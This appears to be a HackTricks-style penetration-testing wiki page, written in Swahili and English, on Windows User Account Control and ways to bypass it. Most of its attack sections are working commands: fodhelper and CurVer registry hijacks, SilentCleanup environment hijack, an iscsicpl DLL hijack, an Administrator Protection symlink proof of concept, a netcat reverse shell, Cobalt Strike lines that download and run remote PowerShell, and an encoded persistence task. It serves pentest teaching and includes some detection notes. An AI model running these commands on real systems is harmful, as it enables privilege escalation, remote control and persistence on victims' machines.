# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **ombi la idhini kwa shughuli zilizoinuliwa**. Applications zina viwango tofauti vya `integrity`, na program yenye **kiwango cha juu** inaweza kutekeleza kazi ambazo **zinaweza kuhatarisha mfumo**. UAC inapowashwa, applications na tasks kila mara **huendeshwa chini ya muktadha wa usalama wa akaunti isiyo ya administrator** isipokuwa administrator aidhinishe wazi applications/tasks hizo kupata ufikiaji wa kiwango cha administrator kwenye mfumo ili ziendeshwe. Ni kipengele cha urahisi kinachowalinda administrators dhidi ya mabadiliko yasiyokusudiwa, lakini hakichukuliwi kuwa security boundary.

Kwa maelezo zaidi kuhusu viwango vya integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC inapowekwa, mtumiaji wa administrator hupewa tokens 2: token ya standard user, kwa kutekeleza vitendo vya kawaida katika medium integrity, na nyingine yenye privileges za admin.

[Ukurasa huu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unaeleza kwa kina jinsi UAC inavyofanya kazi na unajumuisha mchakato wa logon, user experience, na UAC architecture. Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi kulingana na mahitaji ya organization yao katika kiwango cha local (kwa kutumia secpol.msc), au kusanidi na kusambaza kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Settings mbalimbali zimejadiliwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna settings 10 za Group Policy zinazoweza kuwekwa kwa UAC. Jedwali lifuatalo lina maelezo ya ziada:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies za kusakinisha software kwenye Windows

**local security policies** ("secpol.msc" kwenye systems nyingi) husanidiwa kwa default ili **kuwazuia users wasio-admin kusakinisha software**. Hii inamaanisha kwamba hata kama user asiye-admin anaweza kupakua installer ya software yako, hataweza kuiendesha bila akaunti ya admin.

### Registry Keys za Kulazimisha UAC Kuomba Elevation

Ukiwa standard user asiye na admin rights, unaweza kuhakikisha kwamba akaunti ya "standard" **inaombwa credentials na UAC** inapojaribu kutekeleza actions fulani. Kitendo hiki kitahitaji kurekebisha **registry keys** fulani, ambazo zinahitaji admin permissions, isipokuwa kuwe na **UAC bypass**, au attacker awe tayari amelogin kama admin.

Hata kama user yuko katika group la **Administrators**, mabadiliko haya humlazimisha user **kuingiza tena credentials za akaunti yake** ili kutekeleza administrative actions.

**Kwa vitendo, hii ni muhimu tu ikiwa tayari una elevated token, UAC bypass, au misconfiguration inayokuruhusu kubadilisha keys hizi; vinginevyo registry write yenyewe itazuiwa.**

Registry keys na entries unazopaswa kubadilisha ni zifuatazo (pamoja na default values kwenye mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Hili pia linaweza kufanywa manually kupitia Local Security Policy tool. Baada ya kubadilishwa, administrative operations humlazimisha user kuingiza tena credentials zake.

### Note

**User Account Control si security boundary.** Kwa hiyo, standard users hawawezi kutoka kwenye accounts zao na kupata administrator rights bila local privilege escalation exploit.

### Muombe user 'full computer access'
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode hutumia ukaguzi wa integrity kuzuia michakato yenye kiwango cha juu cha integrity (kama web browsers) kufikia data yenye kiwango cha chini cha integrity (kama folda ya temporary Internet files). Hili hufanywa kwa kuendesha browser kwa kutumia low-integrity token. Browser inapojaribu kufikia data iliyohifadhiwa katika low-integrity zone, operating system hukagua kiwango cha integrity cha mchakato na kuruhusu access ipasavyo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution kupata access kwa data nyeti iliyo kwenye mfumo.
- Mtumiaji anapoingia kwenye Windows, mfumo huunda access token yenye orodha ya privileges za mtumiaji. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za mtumiaji. Token pia huwa na orodha ya credentials za mtumiaji, ambazo hutumika kumthibitisha mtumiaji kwa computer na resources zilizo kwenye network.

### Autoadminlogon

Ili kusanidi Windows iingie kiotomatiki kwa mtumiaji maalum wakati wa startup, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya testing. Tumia hii kwenye secure systems pekee, kwa sababu inaweka password wazi kwenye registry.

Weka keys zifuatazo ukitumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Ili kurejesha tabia ya kawaida ya logon, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni rahisi, kwa kuwa unaweza kubofya tu "Yes" UAC prompt inapoonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, process yako inaendeshwa katika medium integrity context, na user wako ni wa administrators group**.

Ni muhimu kutaja kwamba ni **vigumu zaidi kubypass UAC ikiwa iko kwenye kiwango cha juu zaidi cha security (Always) kuliko ikiwa iko kwenye viwango vingine (Default).**

### Fast triage from a medium-integrity shell

Kabla ya kujaribu bypass, thibitisha kuwa uko kwenye scenario sahihi na linganisha host build na methods zinazojulikana kufanya kazi:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Vidokezo vya vitendo:
- Ikiwa `EnableLUA=0`, huhitaji bypass: token yoyote ya admin inaweza kuomba high integrity moja kwa moja.
- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / COM-based bypasses.
- `Always Notify` huongeza kiwango cha ulinzi, lakini bado unapaswa kujaribu build halisi badala ya kudhani kuwa itashindwa: UACME bado inafuatilia baadhi ya mbinu zinazoendana na `AlwaysNotify` kwenye Windows builds za kisasa.

### UAC ikiwa imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`), unaweza **kutekeleza reverse shell yenye haki za admin** (high integrity level) kwa kutumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (ufikiaji kamili wa mfumo wa faili)

Ikiwa una shell yenye user aliye ndani ya group la Administrators, unaweza **mount C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) locally kama disk mpya na utakuwa na **access ya kila kitu ndani ya mfumo wa faili** (hata folder la nyumbani la Administrator).

> [!WARNING]
> **Inaonekana kama trick hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu zaidi cha usalama
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina modules kadhaa za **bypass** ya **UAC**.

### Interfaces za COM zilizoinuliwa (`ICMLuaUtil` / `CMSTPLUA`)

COM objects zinazojielevate zinasalia kuwa UAC surface ya vitendo kwenye builds za kisasa. `ICMLuaUtil` bado inafuatiliwa na UACME kama inayofanya kazi kwenye Windows branches za sasa, na offensive tooling inaendelea kuibadilisha `CMSTPLUA` kwa kuchanganya process ya interactive desktop, execution ya 64-bit, na wakati mwingine PEB/process masquerading kabla ya kuita COM Elevation Moniker.

Vidokezo vya vitendo:
- Pendelea process ya **64-bit** iliyo kwenye **interactive session** ya mtumiaji (mara nyingi `explorer.exe` au child wake).
- Ikiwa raw shell itashindwa, jaribu tena kutoka kwa BOF / UACME implementation badala ya naive `CreateProcess` wrapper.
- Tarajia child execution kufanyika katika **separate elevated process**; BOF nyingi haziinui beacon ya sasa in-place.

### KRBUACBypass

Documentation na tool zinapatikana kwenye [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **compilation** ya UAC bypass exploits kadhaa. Kumbuka kwamba utahitaji **ku-compile UACME kwa kutumia visual studio au msbuild**. Compilation itaunda executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`) , utahitaji kujua **ni ipi unayohitaji.**\
Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya bypasses zita-**promtp** baadhi ya **programs** nyingine ambazo zitam-**alert** **user** kwamba kuna kitu kinaendelea.

UACME ina **build version ambayo kila technique ilianza kufanya kazi**. Unaweza kutafuta technique inayoathiri versions zako:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, ukitumia ukurasa [huu](https://en.wikipedia.org/wiki/Windows_10_version_history) unapata toleo la Windows `1607` kutoka kwenye matoleo ya build.

Mtiririko wa kazi wa vitendo ni kwanza **kupima build ya host**, kisha tu kuendesha method inayolingana:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` hulinganisha haraka build ya ndani na UAC methods zake zinazojulikana, jambo linalosaidia kuondoa haraka PoCs zilizokufa.
- `UACME` bado ni catalogue bora ya umma ya kuhusisha bypass na build mahususi. Matoleo ya hivi karibuni yaliongeza methods mpya na kujaribu tena zilizokuwepo dhidi ya **Windows 11 25H2**, kwa hiyo kagua tena README/release notes kabla ya kudhani kuwa blog post ya zamani bado inatumika bila mabadiliko.

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` hujiinua kiotomatiki kwenye Windows za kisasa. Inapozinduliwa, huuliza registry path ya kila mtumiaji iliyo hapa chini bila kuthibitisha verb ya `DelegateExecute`. Kuweka command hapo humwezesha process yenye Medium Integrity (mtumiaji yuko kwenye Administrators) kuzindua process yenye High Integrity bila UAC prompt.

Registry path inayoulizwa na fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Hatua za PowerShell (weka payload yako, kisha trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Maelezo:
- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni cha default/lenient (si Always Notify yenye restrictions za ziada).
- Tumia njia ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka kwenye process ya 32-bit kwenye Windows ya 64-bit.
- Payload inaweza kuwa command yoyote (PowerShell, cmd, au njia ya EXE). Epuka UI zinazoomba mwingiliano kwa ajili ya stealth.

#### CurVer/extension hijack variant (HKCU only)

Recent samples zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **huelekeza upya ProgID ya `ms-settings`** kupitia value ya `CurVer` ya kila mtumiaji. Binary ya auto-elevated bado hutatua handler chini ya `HKCU`, kwa hiyo admin token haihitajiki ili kupanda keys:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Baada ya kupata privileges zilizoinuliwa, **malware kwa kawaida huzima prompts za baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion ya ziada (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na kuunda upya persistence ili iendeshe kwa high integrity. Kazi ya kawaida ya persistence huhifadhi **PowerShell script iliyosimbwa kwa XOR** kwenye diski na kuidecode na kuiendesha in-memory kila saa:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Toleo hili bado husafisha dropper na kuacha staged payloads pekee, hivyo detection hutegemea kufuatilia **`CurVer` hijack**, uchezewaji wa `ConsentPromptBehaviorAdmin`, uundaji wa Defender exclusion, au scheduled tasks zinazo-decrypt PowerShell in-memory.

### UAC bypass kupitia task ya `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` huzindua `cleanmgr.exe` ikiwa na highest privileges na hupanua `%windir%` kutoka kwenye user environment. Ukidhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwenye command yoyote na kupata high integrity bila consent dialog. Njia hii bado inafaa kujaribiwa kwenye builds za hivi karibuni kwa sababu UACME inaendelea kuweka technique hii ikiwa active, na ufuatiliaji wa issues za hivi karibuni unaonyesha kuwa Windows 11 24H2 huenda ikahitaji marekebisho madogo tu ya quoting.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Ikiwa task inataja path kwenye build hiyo, jaribu tena kwa payload inayoishia na alama ya nukuu (kwa mfano `cmd.exe"`). Kila mara safisha `HKCU\Environment\windir` baada ya kufanya majaribio.

#### More UAC bypass

More UAC bypass nyingi za kawaida zinazotumia vibaya UI flows, COM objects, au desktop interaction zinahitaji **full interactive session** na victim; shell ya kawaida ya `nc.exe` au service inayoendesha katika **Session 0** mara nyingi haitoshi.

Mara nyingi unaweza kutatua hilo kwa kutumia session ya **meterpreter**. Migrate kwenda kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:

![Elekeza ms-settings kwenye custom extension (.thm) na uhusishe extension hiyo na payload yetu - More UAC bypass: Unaweza kupata hii kwa kutumia meterpreter session. Migrate kwenda kwenye process yenye Session...](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass with GUI

Ikiwa una access ya **GUI**, unaweza tu kukubali UAC prompt inapoonekana; kwa kweli huhitaji technical bypass. Kwa hivyo, kupata GUI session mara nyingi hutosha kuondoa kikwazo cha kiutendaji kinachoongezwa na UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa akiitumia (huenda kupitia RDP), kuna **baadhi ya tools zitakazoendeshwa kama administrator** ambazo unaweza kutumia **kuendesha** **cmd**, kwa mfano **kama admin**, moja kwa moja bila kuulizwa tena na UAC, kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa na **stealth** zaidi.

### Noisy brute-force UAC bypass

Ikiwa hujali kuwa noisy, unaweza kila mara **kuendesha kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **huomba permissions za juu hadi user akubali**.

### Your own bypass - Basic UAC bypass methodology

Ukiangalia **UACME**, utaona kwamba **UAC bypasses nyingi hutumia vibaya DLL hijacking** (mara nyingi kwa kufanya binary iliyo elevated ipakie DLL inayodhibitiwa na attacker kutoka kwenye writable path). [Soma hii ili ujifunze jinsi ya kupata vulnerability ya DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary inayofanya **autoelevate** (hakikisha kwamba inapotekelezwa inaendeshwa katika high integrity level).
2. Kwa kutumia procmon, tafuta events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya **protected paths** (kama C:\Windows\System32) ambako huna writing permissions. Unaweza kukwepa hili kwa kutumia:
1. **wusa.exe**: Windows 7,8 na 8.1. Inakuruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii hutekelezwa kutoka kwenye high integrity level).
2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya protected path na kutekeleza binary iliyo vulnerable na autoelevated.

### Another UAC bypass technique

Inahusisha kuangalia ikiwa **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **name/path** ya **binary** au **command** itakayot **ekelezwa** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` ni binary **auto-elevated** ambayo inaweza kutumiwa vibaya kupakia `iscsiexe.dll` kulingana na search order. Ikiwa unaweza kuweka `iscsiexe.dll` yenye madhara ndani ya folder inayoweza kuandikwa na **user**, kisha urekebishe `PATH` ya current user (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza kupakia attacker DLL ndani ya process ya `iscsicpl.exe` iliyo elevated **bila kuonyesha UAC prompt**.

Mambo ya kuzingatia:
- Hii ni muhimu wakati current user yuko kwenye **Administrators** lakini anaendesha katika **Medium Integrity** kwa sababu ya UAC.
- Nakala ya **SysWOW64** ndiyo inayohusika na bypass hii. Ichukulie nakala ya **System32** kama binary tofauti na uthibitishe tabia yake kivyake.
- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, kwa hivyo workflow ileile ya ProcMon inayotumiwa kwa UAC bypasses nyingine ni muhimu kuthibitisha missing DLL load.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Mawazo ya Detection:
- Toa alert kwenye `reg add` / registry writes kwenda `HKCU\Environment\Path` yanayofuatwa mara moja na execution ya `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tafuta `iscsiexe.dll` katika maeneo yanayodhibitiwa na **user**, kama `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlate launches za `iscsicpl.exe` na child processes zisizotarajiwa au DLL loads kutoka nje ya directories za kawaida za Windows.

### Utafiti mpya unaostahili kuchunguzwa kando

Baadhi ya chains za baada ya 2024 hazifanani tena na classic `HKCU\Software\Classes` registry hijacks. Kwa mfano, activation-context cache poisoning inaweza kuunganisha **drive remap** na **DLL redirection** ili kupanda kutoka medium hadi high integrity kupitia trusted UI / auto-elevated binaries kama `ctfmon.exe`, na baadaye targets kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia compact payload examples katika:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack kupitia per-logon-session DOS device map

Kwa attack surface kamili ya `RAiLaunchAdminProcess` / UIAccess kwenye Windows 11 25H2, angalia ukurasa maalum:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” hutumia shadow-admin tokens zenye per-session `\Sessions\0\DosDevices/<LUID>` maps. Directory huundwa lazily na `SeGetTokenDeviceMap` wakati wa resolution ya kwanza ya `\??`. Ikiwa attacker ana-impersonate shadow-admin token katika **SecurityIdentification** pekee, directory huundwa huku attacker akiwa **owner** (inarithi `CREATOR OWNER`), hivyo kuruhusu drive-letter links zinazotangulia `\GLOBAL??`.

**Hatua:**

1. Kutoka kwenye low-privileged session, ita `RAiProcessRunOnce` ili ku-spawn promptless shadow-admin `runonce.exe`.
2. Duplicate primary token yake kuwa **identification** token na u-impersonate token hiyo unapofungua `\??` ili kulazimisha kuundwa kwa `\Sessions\0\DosDevices/<LUID>` chini ya ownership ya attacker.
3. Unda `C:` symlink hapo inayoelekeza kwenye attacker-controlled storage; filesystem accesses zinazofuata katika session hiyo zita-resolve `C:` kwenda kwenye attacker path, hivyo kuwezesha DLL/file hijack bila prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Marejeo
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – Mkusanyiko wa mbinu za UAC bypass](https://github.com/hfiref0x/UACME)
- [WinPwnage – UAC bypass compatibility scanner and launcher](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI Inatumia AI Kuzalisha PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Dhidi ya Malengo ya Serikali za Kusini-Mashariki mwa Asia](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Kubypass Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – Kubypass Administrator Protection kwa Kutumia UI Access Vibaya](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – Bypass UAC kwa Kutumia SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
